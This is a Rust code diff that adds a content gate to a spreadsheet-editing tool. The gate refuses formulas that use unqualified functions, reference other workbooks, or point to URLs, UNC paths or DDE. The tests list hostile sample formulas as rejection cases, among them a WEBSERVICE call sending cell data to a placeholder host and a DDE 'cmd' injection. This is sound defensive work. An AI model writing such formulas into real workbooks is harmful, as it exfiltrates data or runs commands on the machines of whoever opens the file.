@@ -1185,6 +1185,10 @@ fn apply_xlsx(tool: &str, bytes: &[u8], batch: &ArtifactBatch) -> Result<Vec<u8>
         let set = match kind {
             "formula" => {
                 let f = value.and_then(|v| v.as_str()).unwrap_or("");
+                let sheets = wb.sheet_names();
+                check_formula_allowed(f, &sheets).map_err(|reason| {
+                    ToolError::failed(tool, format!("op {}: formula refused: {reason}", op.op_id))
+                })?;
                 harbor_artifacts::workbook::CellSet::Formula(f.trim_start_matches('=').to_string())
             }
             "number_decimal" => {
@@ -1361,6 +1365,73 @@ impl Tool for ArtifactProposeBatch {
 /// Qualified function targets from `22_Formula_Coverage.json` (the
 /// authority file is embedded so the tool cannot drift from it).
 const FORMULA_COVERAGE_JSON: &str = include_str!("../../../../22_Formula_Coverage.json");
+
+/// The deterministic content gate below the model for any formula that a
+/// batch would write (security review, production plan C4): only functions
+/// the pinned engine qualifies, no references outside this workbook.
+/// `[Book]Sheet!A1`, `\\server\share`, `scheme://` and quoted sheet names
+/// with path characters are external-link syntax (data exfiltration once
+/// the file is opened elsewhere); a sheet name not in `known_sheets` is a
+/// dangling or foreign reference. `known_sheets` empty skips the sheet
+/// check (the caller had no workbook facts).
+pub fn check_formula_allowed(formula: &str, known_sheets: &[String]) -> Result<(), String> {
+    let body = formula.trim().trim_start_matches('=');
+    if body.is_empty() {
+        return Err("empty formula".into());
+    }
+    static FN_RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    static SHEET_RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
+    let fn_re = FN_RE
+        .get_or_init(|| regex::Regex::new(r"([A-Za-z][A-Za-z0-9_.]*)\s*\(").expect("fn regex"));
+    let sheet_re = SHEET_RE.get_or_init(|| {
+        regex::Regex::new(r"'([^']+)'!|([A-Za-z_][A-Za-z0-9_.]*)!").expect("sheet regex")
+    });
+    // Strip string literals before scanning so quoted text cannot smuggle
+    // or hide syntax; a literal is opaque data, not a reference.
+    let mut stripped = String::with_capacity(body.len());
+    let mut in_string = false;
+    for ch in body.chars() {
+        if ch == '"' {
+            in_string = !in_string;
+            continue;
+        }
+        if !in_string {
+            stripped.push(ch);
+        }
+    }
+    if in_string {
+        return Err("unterminated string literal".into());
+    }
+    if stripped.contains('[') || stripped.contains(']') {
+        return Err("references another workbook ([Book]Sheet!ref)".into());
+    }
+    if stripped.contains("\\\\") || stripped.contains("://") || stripped.contains('|') {
+        return Err("references an external location (UNC path, URL or DDE)".into());
+    }
+    let qualified = qualified_functions();
+    for cap in fn_re.captures_iter(&stripped) {
+        let name = cap[1].to_ascii_uppercase();
+        if !qualified.contains(&name) {
+            return Err(format!("function {name} is not in the qualified set"));
+        }
+    }
+    for cap in sheet_re.captures_iter(&stripped) {
+        let sheet = cap
+            .get(1)
+            .or_else(|| cap.get(2))
+            .map(|m| m.as_str())
+            .unwrap_or("");
+        if sheet.contains('/') || sheet.contains('\\') || sheet.contains(':') {
+            return Err(format!(
+                "sheet reference {sheet:?} looks like an external path"
+            ));
+        }
+        if !known_sheets.is_empty() && !known_sheets.iter().any(|k| k == sheet) {
+            return Err(format!("sheet {sheet:?} is not in this workbook"));
+        }
+    }
+    Ok(())
+}
 
 pub fn qualified_functions() -> BTreeSet<String> {
     let v: Value = serde_json::from_str(FORMULA_COVERAGE_JSON).unwrap_or(Value::Null);
@@ -1699,6 +1770,16 @@ impl Tool for FormulaBuildOperations {
         // workbook.conventions reports a flat `findings` array in the same
         // sheet/address/target_id/content_hash shape.
         collect(audit.pointer("/findings").and_then(Value::as_array));
+        let known_sheets: Vec<String> = audit
+            .get("sheets")
+            .and_then(Value::as_array)
+            .map(|a| {
+                a.iter()
+                    .filter_map(|v| v.as_str().or_else(|| v.get("name").and_then(Value::as_str)))
+                    .map(str::to_string)
+                    .collect()
+            })
+            .unwrap_or_default();
         let mut operations = Vec::new();
         let mut review = Vec::new();
         let mut rejected = Vec::new();
@@ -1734,6 +1815,14 @@ impl Tool for FormulaBuildOperations {
                         rejected.push(
                             json!({"address": key, "reason": "formula is unchanged; not a fix"}),
                         );
+                        continue;
+                    }
+                    // A model may spell a formula (formula-audit's triage);
+                    // the content gate keeps it inside the qualified set and
+                    // this workbook whatever the model was told.
+                    if let Err(reason) = check_formula_allowed(&normalized, &known_sheets) {
+                        rejected
+                            .push(json!({"address": key, "reason": format!("refused: {reason}")}));
                         continue;
                     }
                     if content_hash.is_empty() {
@@ -2399,6 +2488,72 @@ mod tests {
         let batch = fill["batch"].clone();
         assert_eq!(batch["operations"][0]["kind"], "text.replace");
         assert_eq!(batch["operations"][0]["precondition"]["target_id"], "p:2");
+    }
+
+    #[test]
+    fn formula_content_gate_refuses_unqualified_functions_and_external_references() {
+        let sheets = vec!["Budget".to_string()];
+        assert!(check_formula_allowed("=SUM(B2:B3)", &sheets).is_ok());
+        assert!(check_formula_allowed("=IF(Budget!B2>0,ROUND(B2/3,2),0)", &sheets).is_ok());
+        // Text inside a string literal is opaque data, not a reference.
+        assert!(check_formula_allowed(r#"="see [notes] at x://y"&A1"#, &sheets).is_ok());
+        for bad in [
+            r#"=WEBSERVICE("https://x.example/?"&A1)"#,
+            r#"=HYPERLINK("https://x.example", "go")"#,
+            "='\\\\srv\\share\\[Budget.xlsx]Data'!A1",
+            "=[Other.xlsx]Sheet1!A1",
+            "=cmd|'/c calc'!A0",
+            "=Missing!A1",
+            "=FOO(B2)",
+            "=",
+        ] {
+            let err = check_formula_allowed(bad, &sheets).unwrap_err();
+            assert!(!err.is_empty(), "{bad}");
+        }
+        // Without workbook facts the sheet check is skipped, the rest holds.
+        assert!(check_formula_allowed("=Other!A1", &[]).is_ok());
+        assert!(check_formula_allowed("=WEBSERVICE(A1)", &[]).is_err());
+    }
+
+    #[test]
+    fn build_operations_refuses_model_formulas_outside_the_gate() {
+        let audit = json!({
+            "sheets": ["Budget"],
+            "static": {"errors": [
+                {"sheet": "Budget", "address": "B4", "target_id": "cell:Budget:B4", "content_hash": "a".repeat(64), "formula": "B2/B3"}
+            ]}
+        });
+        let build = FormulaBuildOperations::new();
+        let artifacts = MemoryArtifacts::new();
+        let cancel = AtomicBool::new(false);
+        let host = json!({});
+        let ctx = ToolContext {
+            artifacts: &artifacts,
+            knowledge: None,
+            provider: None,
+            model: None,
+            workspace_root: None,
+            host_inputs: &host,
+            cancel: &cancel,
+            trace_key: None,
+            deadline: None,
+        };
+        let out = build
+            .call(
+                &ctx,
+                &json!({"audit": audit, "decisions": [
+                    {"sheet": "Budget", "address": "B4", "action": "fix", "formula": "=WEBSERVICE(\"https://x/\"&B2)", "reason": "r"},
+                    {"sheet": "Budget", "address": "B4", "action": "fix", "formula": "=IFERROR(B2/B3,0)", "reason": "r"}
+                ]}),
+            )
+            .unwrap();
+        assert_eq!(out["operations"].as_array().unwrap().len(), 1, "{out}");
+        assert_eq!(out["operations"][0]["args"]["value"], "=IFERROR(B2/B3,0)");
+        assert_eq!(out["rejected"].as_array().unwrap().len(), 1);
+        assert!(out["rejected"][0]["reason"]
+            .as_str()
+            .unwrap()
+            .contains("WEBSERVICE"));
     }
 
     #[test]
